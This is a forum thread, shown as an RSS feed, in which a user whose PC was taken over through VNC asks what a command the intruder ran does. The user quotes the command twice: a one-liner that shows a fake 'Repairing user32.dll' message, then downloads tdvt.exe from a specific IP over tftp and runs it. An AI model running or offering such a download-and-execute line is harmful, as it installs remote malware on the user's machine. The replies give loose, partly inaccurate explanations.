channel.title: Hacked!
channel.description:
Ok, this is the billionth time htis has happened, I was looking at some stuff, and all of a sudden, some odd stuff started happening, some one took control of my pc, and ran [code] %comspec% /c echo Repairing user32.dll & echo Please wait... & tftp -i 76.115.51.217 GET tdvt.exe & start tdvt& [/code]
please tell me what it does, this is the first time I am aware of them running it, normally they instantly install password managers and shit.

item.title: Hacked!
item.dc:creator: @Hiaburi Hiaburi
item.description:
@Hiaburi wrote:

@mopar tried, its so fucked, every one gives me the same stupid command to configure it and then they quit helping, and idk anyhting else to try,

I just uninstalled it, gunna go with ultravnc from now on, ive heard its good…

Read full topic

item.title: Hacked!
item.dc:creator: @VB7_Rocks VB7 Rocks
item.description:
@VB7_Rocks wrote:

Hiaburi:

just changed my password to 21349743645872342 and they got on again, I have a serious issue here… so eh, yea, no more using my pc lol…

How about

Uninstall VNC? Or do you need it for some reason?

And the command looks like it’s trying to transfer a file to or from your computer and then execute it.

Read full topic

item.title: Hacked!
item.dc:creator: @moparisthebest Moparisthebest
item.description:
@moparisthebest wrote:

Fix your X server in Ubuntu and use it.

item.title: Hacked!
item.dc:creator: @Hiaburi Hiaburi
item.description:
@Hiaburi wrote:

They use my VNC, sorry, didn’t even think to include that, normally I have no password on it so they get in, idk where htey get my ip, but this time I did have a pass, (1 lol) and they got it and ran that, so my windows install should be good, so what does the command do?

I do have Ubuntu, would use it but it also fucked up, not sure whats wrong but i thas somehitng to do with the display server or w/e it is…

just changed my password to 21349743645872342 and they got on again, I have a serious issue here… so eh, yea, no more using my pc lol…

Read full topic

item.title: Hacked!
item.dc:creator: @VB7_Rocks VB7 Rocks
item.description:
@VB7_Rocks wrote:

Since I doubt, unless you have a serious security issue, that someone could just open up a command terminal and execute that, I believe that your Windows installation is corrupted or infected, either way, a reinstallation would probably fix the issue.

Assuming you’ve ran virus scans (your original post was non-informational in regard to this), a reinstall might be the only option here.

Also, tftp is a file transfer command. From what I can see, it looks like it’s telling you it’s repairing a system file and then sending some other file via FTP.

Read full topic

item.title: Hacked!
item.dc:creator: @Hiaburi Hiaburi
item.description:
@Hiaburi wrote:

wait its my windows install??? how so? how did you come to that conclusion, and what does that command do?

Read full topic

item.title: Hacked!
item.dc:creator: @VB7_Rocks VB7 Rocks
item.description:
@VB7_Rocks wrote:

[quote=“Hiaburi, post:1, topic:195355”]Ok, this is the billionth time htis has happened, I was looking at some stuff, and all of a sudden, some odd stuff started happening, some one took control of my pc, and ran %comspec% /c echo Repairing user32.dll & echo Please wait... & tftp -i 76.115.51.217 GET tdvt.exe & start tdvt&

please tell me what it does, this is the first time I am aware of them running it, normally they instantly install password managers and shit.[/quote]

In other words, your Windows installation is fubar.

Either reinstall it or

Moparisthebest:

http://www.kubuntu.org/download.php#latest

Have a nice day.

Read full topic
